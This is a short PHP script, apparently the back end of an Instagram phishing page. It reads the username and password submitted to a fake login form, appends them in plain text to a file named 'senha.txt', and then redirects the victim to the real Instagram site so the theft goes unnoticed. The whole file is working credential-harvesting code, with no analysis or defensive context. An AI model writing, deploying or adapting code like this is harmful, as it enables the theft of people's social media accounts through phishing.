<?php

$LOGIN = $_POST['username'];
$SENHA = $_POST['password'];

$CONTEUDO = "LOGIN: $LOGIN\nSENHA: $SENHA\n\n\n";
$ARQUIVO = "senha.txt";

$ABRIR = fopen($ARQUIVO, "a");
fwrite($ABRIR, $CONTEUDO);

fclose($ABRIR);

echo '<meta http-equiv="refresh" content="0;url=https://www.instagram.com/">';
exit
?>